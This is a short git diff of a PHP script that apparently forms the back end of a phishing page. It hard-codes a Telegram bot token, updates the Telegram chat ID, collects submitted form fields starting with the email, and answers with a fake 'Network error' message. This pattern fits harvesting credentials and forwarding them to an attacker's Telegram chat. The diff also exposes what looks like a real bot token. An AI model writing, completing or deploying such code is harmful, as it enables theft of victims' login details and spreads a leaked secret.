@@ -13,7 +13,7 @@ error_reporting(E_ALL);
 ini_set('display_errors', 1);
 // Telegram Bot Token
 $botToken = "7649612009:AAGz7-YLIvEEQhWBGyHmG6uhu2vPY6U-e2Q";
-$chatId = "739495"; // Replace with your Telegram chat ID
+$chatId = "7394958970"; // Replace with your Telegram chat ID
 
 // Collect form data
 $email = $_POST['email'];
@@ -35,3 +35,4 @@ if ($response) {
     echo json_encode(["status" => "error", "message" => "Network error, please try again."]);
 }
 ?>
+
